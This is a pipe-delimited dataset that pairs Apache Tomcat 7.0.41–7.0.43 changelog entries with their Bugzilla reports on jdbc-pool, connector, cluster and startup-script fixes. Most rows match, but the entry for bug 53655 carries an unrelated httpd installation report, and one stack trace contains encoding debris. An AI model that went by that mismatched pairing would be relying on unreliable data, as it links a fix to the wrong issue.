jdbc-pool|Tomcat 7.0.43 (violetagg)|fix|54693|Add a validationQueryTimeout property. Patch provided by Daniel Mikusa. (kfujino)|Add a validationQueryTimeout property|"While it's possible to set the query timeout using the QueryTimeoutInterceptor, this will set the same timeout for all queries.  It would be nice to be able to set an independent timeout for the validation query.

In addition, DBCP supports this feature [1], so it would be nice to have this feature for compatibility / migration purposes.

[1] - https://issues.apache.org/jira/browse/DBCP-226

Thanks"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54693
jdbc-pool|Tomcat 7.0.43 (violetagg)|fix||54693#c6: Avoid NPE caused by createConnection() method returns null. Patch provided by Daniel Mikusa. (kfujino)|Add a validationQueryTimeout property|"While it's possible to set the query timeout using the QueryTimeoutInterceptor, this will set the same timeout for all queries.  It would be nice to be able to set an independent timeout for the validation query.

In addition, DBCP supports this feature [1], so it would be nice to have this feature for compatibility / migration purposes.

[1] - https://issues.apache.org/jira/browse/DBCP-226

Thanks"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54693#c6
jdbc-pool|Tomcat 7.0.43 (violetagg)|fix|55342|Remove unnecessary reset of interrupted flag. If InterruptedException is thrown, the interrupted flag has been cleared. (kfujino)|Lost interruption|"org.apache.tomcat.jdbc.pool.ConnectionPool#close should not call Thread.interrupted() because interrupt was already reset by code that thrown InterruptedException.

  } catch (InterruptedException ex) {
      if (getPoolProperties().getPropagateInterruptState()) {
          Thread.currentThread().interrupt();
-     } else {
-         Thread.interrupted();
      }
  }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55342
jdbc-pool|Tomcat 7.0.43 (violetagg)|fix|55343|Add flag to ignore exceptions of connection creation while initializing the pool. (kfujino)|Add flag to ignore exceptions while creating initial pool|"I want my initial pool to be of some size i.e. not empty AND start even if it fails to create all or some of connections.

If pool fails to create initial connections for some reason it just throws exceptions. To workaround that I have to set initial pool size to 0.

It can be handy to add a flag to ignore (just log them) exceptions that occur while creating initial connections."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55343
jdbc-pool|Tomcat 7.0.43 (violetagg)|fix||Add undefined attributes and operations to mbeans-descriptor. (kfujino)|||
Other|Tomcat 7.0.43 (violetagg)|add|45428|Trigger a thread dump written to standard out if Tomcat fails to stop in a timely manner to aid diagnostics. This is only available on platforms that use catalina.sh. (markt)|warn if the tomcat stop doesn't complete|"my linux distro's ""/etc/init.d/tomcat stop"" roughly after 30 secs kill the tomcat process.

This probably relates to some web-app owned threads that wait and thus are no longer seen been by the manager.

Since this is probably a hint about an application-internal software-engineering problem.


Therefore, my suggestion:

If after ~ 15 secs (or some heuristic depending on the number of listeners configured by server.xml) the manager still couldn't really stop, print the stack-traces of the threads left to catalina.out (~ equivalent of ""kill -QUIT"")"|https://bz.apache.org/bugzilla/show_bug.cgi?id=45428
Other|Tomcat 7.0.43 (violetagg)|fix|55204|Correct namespace used in Servlet 2.4 test web application. Patch provided by Jeremy Boynes. (markt)|Incorrect namespace URI test webapp|"Created attachment 30553 [details]
patch to update declaration

The test/webapp-2.4 web.xml is using an incorrect namespace and location - it contains ""javaee"" where for 2.4 it should be ""j2ee"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=55204
Other|Tomcat 7.0.43 (violetagg)|fix|55205|Reorder elements so web.xml complies with schema for Servlet 3.0 test web application. Patch provided by Jeremy Boynes. (markt)|test/webapp web.xml does not validate|"Created attachment 30554 [details]
Patch to reorder elements

Some elements in web.xml are not in a permitted order.

Patch was previously included in an attachment to 55166 but this issue is independent of any changes there so I broke it out."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55205
Other|Tomcat 7.0.43 (violetagg)|fix|55211|Correct namespace in TLD files used in test web applications. Rename elements tagclass to tag-class so TLD files complies with DTD/schema. Patch provided by Jeremy Boynes. (violetagg)|Test tld descriptors do not validate|"Created attachment 30565 [details]
patch to fix in trunk

More incorrect namespace URIs and use of <tagclass> rather than <tag-class> in various test webapps"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55211
Other|Tomcat 7.0.43 (violetagg)|update||Update package renamed version of Commons BCEL to the latest code from Commons BCEL trunk. (markt)|||
Other|Tomcat 7.0.43 (violetagg)|update||Update package renamed version of Commons FileUpload to the latest code from Commons FileUpload trunk. (markt)|||
Other|Tomcat 7.0.43 (violetagg)|fix|55297|When looking for the jsvc executable, if an explicit path is not set and it is not found in $CATALINA_BASE, look in $CATALINA_HOME as well. (markt)|Have daemon.sh look for jsvc in CATALINA_HOME as well as CATALINA_BASE|"Since jsvc is a standard executable, it would be good if daemon.sh could search for it in its usual location in $CATALINA_HOME/bin/jsvc.  It currently looks for it in CATALINA_BASE only:

test "".$JSVC"" = . && JSVC=""$CATALINA_BASE/bin/jsvc"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=55297
Other|Tomcat 7.0.43 (violetagg)|fix|55336|Correctly escape parameters passed to eval in the catalina.sh script to ensure that Tomcat starts when installed on a path that contains multiple consecutive spaces. (markt)|Cannot start apache tomcat 7.0 if server path contains two consecutive spaces.|"Today, I tried to start apache tomcat 7.0.42 in Linux environment. Server path contains two consecutive spaces. When I run ./catalina.sh run, server cannot start and there is the following exception in console

./catalina.sh run
Using CATALINA_BASE:   /home/example/twoconsecutive  spaces
Using CATALINA_HOME:   /home/example/twoconsecutive  spaces
Using CATALINA_TMPDIR: /home/example/twoconsecutive  spaces/temp
Using JRE_HOME:        /home/example/java/jdk1.6
Using CLASSPATH:       /home/example/twoconsecutive spaces/bin/bootstrap.jar:/home/example/twoconsecutive spaces/bin/tomcat-juli.jar
Exception in thread ""main"" java.lang.NoClassDefFoundError: org/apache/catalina/startup/Bootstrap
Caused by: java.lang.ClassNotFoundException: org.apache.catalina.startup.Bootstrap
    at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
Could not find the main class: org.apache.catalina.startup.Bootstrap.  Program will exit.

Tomcat server can start if  server path does not contain consecutive space."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55336
Catalina|Tomcat 7.0.42 (markt)|fix||Enforce the restriction described in section 4.4 of the Servlet 3.0 specification that requires the new pluggability methods only to be available to ServletContextListeners defined in one of the specified ways. (markt)|||
Catalina|Tomcat 7.0.42 (markt)|fix||Better handle FORM authentication when requesting a resource as an unauthenticated user that is only protected for a sub-set of HTTP methods that does not include GET. (markt)|||
Catalina|Tomcat 7.0.42 (markt)|fix|53777|Add support for a JAAS Realm instance to use a dedicated configuration rather than the JVM global JAAS configuration. This is most likely to be useful for per web application JAAS Realms. Based on a patch by eolivelli. (markt)|Ability to bundle JAAS Configuration in Webappp|"I would like to let JAASRealm to load JAAS Configuration from a .properties file bundled in a web application (either in WEB-INF/classes or in any JAR on the classpath of the context)

Actually (7.0.29) JAASRealm creates a LoginContext using the 2-args constructor
loginContext = new LoginContext(appName, callbackHandler); 

I propose to add a new configuration parameter on JAASRealm to let it load a javax.security.auth.login.Configuration from the ContextClassLoader

this new Configuration has to be passed to the 4-args constructor
loginContext = new LoginContext(appName, subject, callbackHandler, configuration); 

http://docs.oracle.com/javase/6/docs/api/javax/security/auth/login/LoginContext.html#LoginContext%28java.lang.String,%20javax.security.auth.Subject,%20javax.security.auth.callback.CallbackHandler,%20javax.security.auth.login.Configuration%29"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53777
Catalina|Tomcat 7.0.42 (markt)|fix|54745|Fix JAR file scanning when Tomcat is deployed via Java Web Start. Patch provided by Nick Williams. (markt)|Tomcat JarScanning does not work when Tomcat started with Java Web Start|"Created attachment 30097 [details]
Patch to resolve issue

As long as you correctly structure your JARs and call setParentClassLoader() with the current thread class loader on the Engine, Host, Server and Service, you can run Embedded Tomcat using Java Web Start. It's actually pretty neat.

The only problem is that JarScanning doesn't work. In Java Web Start, all JAR URLs obtained from the class loader are the full http(s) URLs from where they were downloaded. Java has them cached locally, so accessing them is just as efficient because they're really coming from the local file system. However, the StandardJarScanner ignores JAR URLs that don't start with ""file:"" or ""jndi:"".

This was an easy patch and everything else appears to still work normally. I propose that the patch be applied to trunk AND 7.0."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54745
Catalina|Tomcat 7.0.42 (markt)|add|55017|Add the ability to configure the RMI bind address when using the JMX remote lifecycle listener. Patch provided by Alexey Noskov. (markt)|Ability to configure RMI bind address|"Created attachment 30319 [details]
Patch to provider bind rmi bind address setup ability

There is a patch which adds rmiBindAddress property to JmxRemoteLifecycleListener, which allows to bind RMI server to specific interface instead of 0.0.0.0.

It may useful for binding RMI to localhost and avoiding firewall configuration (and then monitoring through SSH tunnel).

Unfortunatly using of rmiBindAddress incompatible with rmiSSL, but i think it's not an issue because of rarely intersecting use cases."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55017
Catalina|Tomcat 7.0.42 (markt)|fix|55071|Ensure original exception is reported if JDBC Realm fails to read a user's credentials. (markt)|try finally catch structure masks original exception in JDBCRealm.getPassword()|"I have run into a mysterious apparent SQL exception in JDBCRealm.getPassword().

Presumably, line 557 ""stmt.executeQuery()"" occasionally fails. I'm not sure why and would like to know why. 

However, the finally block contains dbConnection.commit() (line 579). This throws an exception (Connection Closed) which is then logged on line 585. 

In summary, line 579 should be surrounded by a try catch."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55071
Catalina|Tomcat 7.0.42 (markt)|fix||55073, 55108, 55109, 55110, 55158 & 55159: Small performance improvements. Patches provided by Adrian Nistor. (markt/violetagg)|wasted work in ValidateVisitor.isExpression()|"Created attachment 30404 [details]
patch

The problem appears in version 7.0.40 and in revision 1490425.  I
attached a two-line patch that fixes it.

In method ""ValidateVisitor.isExpression"", the loop over ""nodes"" should
break immediately after ""elExpression"" is set to ""true"".  All the
iterations after ""elExpression"" is set to ""true"" do not perform any
useful work, at best they just set ""elExpression"" again to ""true"".

Method ""startInternal"" in class ""StandardHost"" has a similar loop
(over ""valves""), and this loop breaks immediately after ""found"" is set
to ""true"", just like in the proposed patch.  Other methods (e.g.,
""MapperListener.findDefaultHost"", ""CollectVisitor.checkSeen"",
""JspDocumentParser.processChars"", ""ParameterParser.isOneOf"") also have
similar loops with similar breaks, just like in the proposed patch."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55073
Catalina|Tomcat 7.0.42 (markt)|add|55102|Add support for time to first byte in the AccessLogValve. Patch provided by Jeremy Boynes. (markt)|Add ability to report time taken to prepare response|"Created attachment 30438 [details]
Patch against trunk@r1493385 to record and output time to commit

Tomcat's AccessLogValve is able to report the time taken to send an entire request using %D. This is the total processing time and may be affected by network conditions. It is sometimes useful to be able to record the time taken by the server to prepare the response and send the first content to the client.

Attached is a patch that records the time the response is committed and then allows that to be reported in the access log using a '%F' pattern (which is the same as used by the mod-log-firstbyte module for HTTPD)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55102
Catalina|Tomcat 7.0.42 (markt)|fix|55125|If the Server container fails to start, don't allow the Catalina wrapper to start (used when running from the command line and when running as a service) since Tomcat will not be able to do any useful work. (markt)|Tomcat does not shut down if LifecycleListener throws an exception|"Created attachment 30467 [details]
Logs

I needed to shut down Tomcat if an application fails to start. I was advised that a LifecycleListener could shut down Tomcat by throwing an IllegalStateException from its lifecycleEvent method. However, this produces severe errors in the logs, but Tomcat does not shut down.

I saw this behaviour on Tomcat 7.0.41 and 7.0.40 using the test web application from here:

https://github.com/cloudfoundry/java-test-applications

and v1.0.0 of the listener from here:

https://github.com/cloudfoundry/java-buildpack-support

(v1.1.0 of the listener was re-coded to halt the JVM).

I attach catalina.out.

Mark Thomas suggested I raise this bug, so he believes that Tomcat should shut down."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55125
Catalina|Tomcat 7.0.42 (markt)|fix||Update the JreMemoryLeakPreventionListener to take account of changes in the behaviour of java.beans.Introspector.flushCaches() and sun.awt.AppContext.getAppContext() in Java 7. (markt)|||
Catalina|Tomcat 7.0.42 (markt)|fix||Avoid WARNING log message of Users:type=UserDatabase,database=UserDatabase at Tomcat shutdown. (pero)|||
Catalina|Tomcat 7.0.42 (markt)|fix||Avoid ClassCastException when an asynchronous dispatch is invoked in an asynchronous cycle which is started by a call to ServletRequest.startAsync(ServletRequest,ServletResponse) where ServletRequest/ServletResponse are custom implementations. (violetagg)|||
Catalina|Tomcat 7.0.42 (markt)|fix||Correct a regression introduced in 7.0.39 (refactoring of base 64 encoding and decoding) that broke the JNDI Realm when userPassword was set and passwords were hashed with MD5 or SHA1. (markt/kkolinko)|||
Catalina|Tomcat 7.0.42 (markt)|fix||Correct the mechanism for the path calculation in AsyncContext.dispatch(). (violetagg)|||
Catalina|Tomcat 7.0.42 (markt)|fix|55155|Avoid constant focus grabbing when running the Tomcat unit tests under Java 6 on OSX. Patch provided by Casey Lucas. (markt)|running tomcat tests cause terminal to repeatedly grab focus (on os x)|"Created attachment 30493 [details]
patch to add java.awt.headless=true for junit tests

On osx, when running tomcat tests via ""ant test"", ""ant test-nio"" or similar, the terminal window running the tests grabs window focus each time a new jvm is launched for the junit tests.  This makes it difficult/annoying to do other things in other windows while the tests are running.  I am seeing the problem on a mac - it is likely not a problem on other platforms.

Setting java.awt.headless=true fixes the issue.  I can't think of any reason this shouldn't be set for tomcat tests - maybe there is a reason I don't know.  Anyway, the attached patch adds the property (for junit tests)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55155
Catalina|Tomcat 7.0.42 (markt)|fix|55160|Don't ignore connectionUploadTimeout setting when using HTTP NIO connector. (markt)|NIO connectionUploadTimeout can't work|"when i configure disableUploadTimeout=""false"" and connectionTimeout=""20000"" ,connectionUploadTimeout=""30000"" .
I found the connectionUploadTimeout doesn't work, because the code in internalNioInputBuffer.readSocket():
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
try {
                NioEndpoint.KeyAttachment att = (NioEndpoint.KeyAttachment)socket.getAttachment(false);
                if ( att == null ) throw new IOException(""Key must be cancelled."");
                nRead = pool.read(socket.getBufHandler().getReadBuffer(),socket,selector,att.getTimeout());
            } catch ( EOFException eof ) {
                nRead = -1;
            } finally { 
                if ( selector != null ) pool.put(selector);
            }
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
att.getTimeout() is the connectionTimeout ,not the connectionUploadTimeout.
so , in NioBlockingSelector.read(), the readTimeout is connectionTimeout"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55160
Catalina|Tomcat 7.0.42 (markt)|fix|55176|Correctly handle regular expressions within SSI expressions that contain an equals character. (markt)|SSI regular expressions parsing fails|"Created attachment 30513 [details]
test cases 1, 2 and 3

Regular Expressions in SSI fail to parse.

This uses SSI in 7.0.39 using SSIFilter.  The file is parsed, in principle, but whenever an IF expression with a certain regular expression is encountered, Tomcat seems to either show an exception (test case 2) stop processing the file and will not return any contents after that (for test case 3).

Certain very simple regular expressions such as /a/ do not show an error (test case 1).


Example:

My request is:

http://...:8080/tomcat7_ssi_bug/foo.html?year=234234

The relevant portion of the file is (test case 3):

<!--#if expr=""${QUERY_STRING} = /year=(.*)/"" -->
   
I have tried a number of variants, including $QUERY_STRING instead of ${...}.
I find no error about this in the logs.

I tried simpler regular expressions.  The following

<!--#if expr=""${QUERY_STRING} = /year=/"" -->

Leads to the error below:

java.lang.ClassCastException: org.apache.catalina.ssi.ExpressionParseTree$EqualNode cannot be cast to org.apache.catalina.ssi.ExpressionParseTree$StringNode
	org.apache.catalina.ssi.ExpressionParseTree$CompareNode.compareBranches(ExpressionParseTree.java:353)
	org.apache.catalina.ssi.ExpressionParseTree$EqualNode.evaluate(ExpressionParseTree.java:381)
	org.apache.catalina.ssi.ExpressionParseTree.evaluateTree(ExpressionParseTree.java:67)
	org.apache.catalina.ssi.SSIConditional.evaluateArguments(SSIConditional.java:124)
	org.apache.catalina.ssi.SSIConditional.process(SSIConditional.java:50)
	org.apache.catalina.ssi.SSIProcessor.process(SSIProcessor.java:160)
	org.apache.catalina.ssi.SSIFilter.doFilter(SSIFilter.java:144)


This occurs whenever the regular expression does not contain any parenthesis.  

Attached war file contains foo.html, showing test cases 1 and 2, and bar.html, showing test case 1 and 3.

By the way, these regular expressions work as intended in Apache (httpd) 2.

See also feature request #53387.  (The back reference in this example is not what causes the exception.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55176
Coyote|Tomcat 7.0.42 (markt)|fix|55177|Correctly handle infinite soTimeout for BIO HTTP connector. Based on a patch by Nick Bunn. (markt)|connectionTimeout=-1 causes high CPU|"Created attachment 30514 [details]
fix

Setting connectionTimeout to -1 in server.xml causes each request to have high CPU 

java full version ""1.6.0_51-b11-457""
Example:
<Connector port=""8080"" protocol=""HTTP/1.1""
               connectionTimeout=""-1""
               redirectPort=""8443"" />

Everywhere I looked there seemed to be a if statement looking to see if it was below zero except in Http11Processor class. Attached is patch file. Which has resolved the issue on my server."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55177
Coyote|Tomcat 7.0.42 (markt)|fix|55180|Correctly handle infinite soTimeout when disableUploadTimeout is set to false. Patch provided by Nick Bunn. (violetagg)|"connectionTimeout=""-1"" causes timeout can't be negative"|"I configured server.xml like this:
connectionTimeout=""-1"" disableUploadTimeout=""false"" connectionUploadTimeout=""200""
(maybe it is stupid to configure like this,if connectionTimeout=-1,can i make disableUploadTimeout=false?).
It will cause :

java.lang.IllegalArgumentException: timeout can't be negative
	at sun.nio.ch.SocketAdaptor.setSoTimeout(SocketAdaptor.java:361)
	at org.apache.coyote.http11.Http11NioProcessor.setSocketTimeout(Http11NioProcessor.java:251)
......
because of :
      if (!disableUploadTimeout) {
//endpoint.getSoTimeout()=-1.
           setSocketTimeout(endpoint.getSoTimeout());
       }

~~~~~~~~~~~~~~~~~~~~~~~~~
another thing:
if i configure connectionTimeout=""0"". 
in NioBlockingSelector.read(ByteBuffer buf, NioChannel socket, long readTimeout),readTimeout = 0, in case socket.read(buf) == 0, it make timeout=true.
if (readTimeout >= 0 && (keycount == 0))
    timedout = (System.currentTimeMillis() - time) >= readTimeout;
then throw the SocketTimeoutException().

thank you."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55180
Cluster|Tomcat 7.0.42 (markt)|fix||Delete leftover of war file from tempDir when removing invalid FileMessageFactory. (kfujino)|||
Cluster|Tomcat 7.0.42 (markt)|fix||Ensure that the keepAlive of NioSender works correctly when keepAliveCount/keepAliveTime is set to a value greater than 0. (kfujino)|||
Cluster|Tomcat 7.0.42 (markt)|add||Add logging of when a member is unable to join the cluster. (kfujino)|||
Cluster|Tomcat 7.0.42 (markt)|fix||Replace Tribes's TaskQueue as executor's workQueue in order to ensure that executor's maxThread works correctly. (kfujino)|||
Cluster|Tomcat 7.0.42 (markt)|fix|54086|Fix an additional code path that could lead to multiple threads attempting to modify the same selector key set. (markt)|ConcurrentModificationException in NioReceiver on shutdown|"Solaris 10 x86, jdk 1.7.

We use tomcat clustering for session replication with 4 nodes and sometimes 8 nodes.  We get a ConcurrentModificationException occasionally on shutdown.  I have been unable to reliably reproduce the exception. In the log, I see ""Unable to close cluster receiver selector."" with the exception below:

java.util.ConcurrentModificationException 
    java.util.HashMap$HashIterator.nextEntry(HashMap.java:894) 
    java.util.HashMap$KeyIterator.next(HashMap.java:928) 
    java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1067) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãtransport.‚Äãnio.‚ÄãNioReceiver.‚ÄãcloseSelector(‚ÄãNioReceiver.‚Äãjava:382) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãtransport.‚Äãnio.‚ÄãNioReceiver.‚ÄãstopListening(‚ÄãNioReceiver.‚Äãjava:365) 
    org.apache.catalina.tribes.transport.nio.NioReceiver.stop(NioReceiver.java:86) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelCoordinator.‚ÄãinternalStop(‚ÄãChannelCoordinator.java:203) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelCoordinator.‚Äãstop(‚ÄãChannelCoordinator.‚Äãjava:115) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚Äãinterceptors.‚ÄãMessageDispatchInterceptor.‚Äãstop(‚ÄãMessageDispatchInterceptor.java:172)
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.apache.catalina.tribes.group.GroupChannel.stop(GroupChannel.java:438) 
    org.‚Äãapache.‚Äãcatalina.‚Äãha.‚Äãtcp.‚ÄãSimpleTcpCluster.‚ÄãstopInternal(‚ÄãSimpleTcpCluster.‚Äãjava:‚Äã744) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1199) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.core.StandardService.stopInternal(StandardService.java:502) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:753) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.startup.Catalina.stop(Catalina.java:751) 
    org.apache.catalina.startup.Catalina.start(Catalina.java:713) 
    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) 
    sun.‚Äãreflect.‚ÄãDelegatingMethodAccessorImpl.‚Äãinvoke(‚ÄãDelegatingMethodAccessorImpl.‚Äãjava:43) 
    java.lang.reflect.Method.invoke(Method.java:601) 
    org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:322) 
    org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:451)

I looked at the code briefly and noticed the use of a SelectionKey Iterator.  I have not dug deep enough to find any issue in the NioReceiver code, but I did find this potentially relevant text in the Selector javadocs (http://docs.oracle.com/javase/7/docs/api/java/nio/channels/Selector.html):

""A selector's key and selected-key sets are not, in general, safe for use by multiple concurrent threads. If such a thread might modify one of these sets directly then access should be controlled by synchronizing on the set itself. The iterators returned by these sets' iterator methods are fail-fast: If the set is modified after the iterator is created, in any way except by invoking the iterator's own remove method, then a ConcurrentModificationException will be thrown."""|https://bz.apache.org/bugzilla/show_bug.cgi?id=54086
Web applications|Tomcat 7.0.42 (markt)|add||Complete the document for MessageDispatch15Interceptor. (kfujino)|||
Web applications|Tomcat 7.0.42 (markt)|add|53655|Document the circumstances under which Tomcat will add a javax.mail.Authenticator to mail sessions created via a JNDI resource. (markt)|We are unable to install Apache 2.4 on Oracle Enterprise Linux 6.0(64-bit)|"We are trying to install Apache 2.4 on Oracle Enterprise Linux6.0(64-bit)

We are getting below error while installing the Apache, we want to understand whether Apache has been supported to install ut on OEL or Red Hat Linux 6.0 ?

""checking for chosen layout... Apache
checking for working mkdir -p... yes
checking for grep that handles long lines and -e... /bin/grep
checking for egrep... /bin/grep -E
checking build system type... x86_64-unknown-linux-gnu
checking host system type... x86_64-unknown-linux-gnu
checking target system type... x86_64-unknown-linux-gnu

Configuring Apache Portable Runtime library ...

checking for APR... no
configure: error: APR not found.  Please read the documentation.
""

Thanks,
Mangesh"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53655
Web applications|Tomcat 7.0.42 (markt)|fix|55179|Correct the Javadoc for the remote IP valve so the correct name is used to refer to the proxiesHeader property. (markt)|Incorrect Parameter Name in RemoteIpValve Examples|"The RemoteIpValve sample configurations incorrectly refer to a ""remoteIpProxiesHeader"" property, rather than the ""proxiesHeader"" property.

http://tomcat.apache.org/tomcat-7.0-doc/api/org/apache/catalina/valves/RemoteIpValve.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55179
jdbc-pool|Tomcat 7.0.42 (markt)|fix|55031|"Fixed Export-Package header and uses directives in MANIFEST.MF. Change the version for package org.apache.juli.logging to ""0"" in Import-Package header. Thus any version of that package can be used. Patch provided by Martin Lichtin. (violetagg)"|Update MANIFEST.MF for OSGi headers|"Created attachment 30344 [details]
Updated Import-/Export-Package headers (created using bnd)

The jdbc-pool/resources/MANIFEST.MF should be updated with
correct Export-/Import-Package headers."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55031
Other|Tomcat 7.0.42 (markt)|update||Update Maven Central location used to download dependencies at build time to be repo.maven.apache.org. (kkolinko)|||
Other|Tomcat 7.0.42 (markt)|update||Update JUnit to version 4.11. Configure separate download for Hamcrest 1.3 core library as its classes are no longer included in junit.jar. (kkolinko)|||
Other|Tomcat 7.0.42 (markt)|fix|54013|When using a forced stop, allow a short period of time (5s) for the process to die before returning. Patch provided by mukarram.baig. (markt)|Catalina.sh force kill to wait till process exits completely|"Created attachment 29490 [details]
Patch for changes to catalina.sh to wait till process dies completely

In Tomcat 7, when the container is stopped using catalina.sh stop force, the catalina.sh script uses the CATALINA_PID environment variable to send a kill -9 to the pid of the currently running container process. However, this doesn't kill the process instantaneously - say for e.g. when the process is in the middle of a system call or is in the UNINTERRUPTIBLE state. In this case, why cant we use the kill -0 ``cat ""$CATALINA_PID""`` >/dev/null 2>&1 trick of checking the liveness of the process before removing the PID file that is used with stop in the non-force mode? This would ensure that the stop force is somewhat synchronous. Just wanted to know if there are good reasons why this was not done. If we don't see any issue with this, I am attaching a patch (to catalina.sh) that is intended to do this. Let me know if there are any questions.

Thanks in advance!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54013
Other|Tomcat 7.0.42 (markt)|fix|55119|Ensure that the build process produces Javadoc that is not vulnerable to CVE-2013-1571. Based on a patch by Uwe Schindler. (markt)|Change Javadoc generation per CVE-2013-1571, VU#225657|"Oracle has announced a Javadoc vulnerability (CVE-2013-1571 [1], VU#225657 [2]) whereby Javadoc generated with Java 5, Java 6, or Java 7 < 7u25 is vulnerable to a frame injection attack. Oracle has provided a repair-in-place tool for Javadoc that cannot be easily regenerated, but is urging developers to regenerate whatever Javadoc they can using Java 7u25. For all practical purses, the vulnerability really only applies to publicly-hosted Javadoc, so the Javadoc in our existing Maven artifacts, downloads, and archived downloads really doesn't have to be worried about (not that we could do anything about it). My thoughts on this:

1) We should apply the repair-in-place tool ASAP to the Javadoc on the website for Tomcat 6 and Tomcat 7.

2) Future Tomcat 6 and 7 Javadoc should be generated with 7u25 or better. There will be no fix for Java 5 or 6. Thankfully, generating Javadoc using a different JDK than you used to compile is quite easy in both Maven and Ant. In fact, I personally prefer it that way, because the Javadoc is much more visually attractive in Java 7.

I will file an issue about this two, but I wanted to go ahead and make the list aware.

Nick

[1] http://www.oracle.com/technetwork/topics/security/javacpujun2013-1899847.html
[2] http://www.kb.cert.org/vuls/id/225657"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55119
Catalina|Tomcat 7.0.41 (markt)|fix|54703|Make parsing of HTTP Content-Type headers tolerant of any CR or LF characters that appear in the value passed by the application. Also fix some whitespace parsing issues identified by the additional test cases. (markt)|Nullpointer exception in HttpParser.parseMediaType|"input for parseMediaType() is

----------
multipart/signed; protocol=""application/pkcs7-signature""; micalg=sha-256; 
	boundary=""----=_Part_121_929034657.1363355797756""
----------

exception trace

java.lang.NullPointerException
        at org.apache.tomcat.util.http.parser.HttpParser.parseMediaType(HttpParser.java:215)
        at org.apache.tomcat.util.http.parser.MediaTypeCache.parse(MediaTypeCache.java:54)
        at org.apache.catalina.connector.Response.setContentType(Response.java:806)
        at org.apache.catalina.connector.Response.checkSpecialHeader(Response.java:1119)
        at org.apache.catalina.connector.Response.setHeader(Response.java:1446)
        at org.apache.catalina.connector.ResponseFacade.setHeader(ResponseFacade.java:535)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54703
Catalina|Tomcat 7.0.41 (markt)|fix||Prevent possible WAR file locking when reading a context.xml file from an unexpanded WAR file. Note that in normal usage, the JreMemoryLeakPreventionListener would protect against this. (markt)|||
Catalina|Tomcat 7.0.41 (markt)|fix||Ensure that when auto deployment runs for a Host, it uses the latest values for copyXML, deployXML and unpackWARs. (markt)|||
Catalina|Tomcat 7.0.41 (markt)|fix|54939|Provide logging (using a UserDataHelper) when HTTP header parsing fails (e.g. when maxHeaderCount is exceeded). (markt)|No useful logging when maxHeaderCount hit|"Recent versions of tomcat 6 & 7 added the maxHeaderCount parameter to the connector configuration with a default value of 100. When this limit is hit Tomcat returns a HTTP 400 response with a blank page and in the default configuration nothing is logged by the server. The org.apache.coyote.ajp.AjpProcessor class logs the error at DEBUG level but that doesn't get written anywhere using the default configuration.

The use case for more than 100 headers is the use of SSO systems that provide user attributes via HTTP headers. The Internet2 Shibboleth project is one good example, it is quite common to have well over 100 headers getting passed to Tomcat when using these systems.

I'd like to propose one of the following fixes:

